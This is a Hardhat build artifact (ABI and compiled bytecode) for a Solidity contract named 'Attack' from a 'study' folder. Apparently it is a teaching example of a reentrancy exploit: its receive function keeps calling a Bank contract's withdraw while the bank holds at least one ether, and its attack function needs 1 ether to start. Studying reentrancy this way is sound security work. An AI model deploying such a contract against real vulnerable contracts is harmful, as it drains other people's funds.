{
  "_format": "hh3-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/study/ReentrancyAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Bank",
          "name": "_bank",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bank",
      "outputs": [
        {
          "internalType": "contract Bank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x6080604052348015600e575f5ffd5b506040516102dc3803806102dc833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b610256806100865f395ff3fe608060405260043610610036575f3560e01c806312065fe0146100b357806376cdb03b146100d25780639e5faafc14610108575f5ffd5b366100af575f54670de0b6b3a76400006001600160a01b0390911631106100ad575f805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b158015610096575f5ffd5b505af11580156100a8573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b3480156100be575f5ffd5b506040514781526020015b60405180910390f35b3480156100dd575f5ffd5b505f546100f0906001600160a01b031681565b6040516001600160a01b0390911681526020016100c9565b6100ad34670de0b6b3a7640000146101665760405162461bcd60e51b815260206004820152601960248201527f52657175697265203120457468657220746f2061747461636b00000000000000604482015260640160405180910390fd5b5f805460408051630d0e30db60e41b815290516001600160a01b039092169263d0e30db092670de0b6b3a764000092600480820193929182900301818588803b1580156101b1575f5ffd5b505af11580156101c3573d5f5f3e3d5ffd5b50505f805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b158015610208575f5ffd5b505af115801561021a573d5f5f3e3d5ffd5b5050505056fea26469706673582212209449409bdf8ca08ff2a1e3063cdd715dc6351adbd5408ec8289276154755bf5a64736f6c634300081c0033",
  "linkReferences": {},
  "deployedLinkReferences": {},
  "immutableReferences": {},
  "inputSourceName": "project/contracts/study/ReentrancyAttack.sol",
  "buildInfoId": "solc-0_8_28-7d7f2cca6187009072259667f9e71d8dbc9b97e0"
}